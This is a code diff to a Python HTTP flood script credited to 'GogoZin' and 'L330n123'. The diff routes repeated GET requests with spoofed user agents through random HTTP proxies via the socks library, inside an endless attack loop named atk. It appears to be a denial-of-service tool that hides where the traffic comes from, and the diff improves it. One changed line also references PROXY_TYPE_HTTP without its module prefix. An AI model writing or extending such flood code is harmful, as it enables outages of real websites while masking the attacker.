@@ -9,6 +9,7 @@
 
 import time
 import socket
+import socks
 import random
 import requests
 import threading
@@ -140,7 +141,7 @@ def main():
 
 def atk():
 	global on
-	xzc = random.randint(100,6553500)
+	xzc = random.randint(0,100)
 	get_host = "GET /?="+ str(xzc) +" HTTP/1.1\r\nHost: " + str(url)+ ":" + str(port) +"\r\n"
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                               #Code By GogoZin
@@ -148,17 +149,18 @@ def atk():
 	rqs = get_host + useragent + accept + connection + "\r\n"
 	#pprr = open(list).readlines()
 	proxy = random.choice(pprr).strip().split(":")
+	socks.setdefaultproxy(PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True)
 	time.sleep(5)
 	while True:
 		while on:
 			try:
-				s = socket.socket()
+				s = socks.socksocket()
 				s.connect((str(proxy[0]), int(proxy[1]))) 
 				s.send(str.encode(rqs))
 				try:
 					for i in range(times):                                                          #Code By GogoZin, Improved By L330n123
 						s.send(str.encode(rqs))
-					print("Sucess Sent Requests From ~> " + str(proxy[0])+":"+str(proxy[1]))
+					print("Sucess Sent Requests From ~ [ " + str(proxy[0])+":"+str(proxy[1]) + " ] ")
 					s.close()
 				except:
 					s.close()
